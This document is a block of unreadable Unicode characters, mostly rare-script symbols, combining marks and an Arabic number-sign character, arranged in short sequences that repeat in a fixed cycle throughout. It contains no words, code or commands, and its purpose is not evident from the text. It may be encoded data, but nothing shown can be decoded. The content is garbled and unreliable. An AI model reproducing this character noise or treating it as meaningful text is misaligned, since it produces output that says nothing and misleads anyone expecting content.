࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬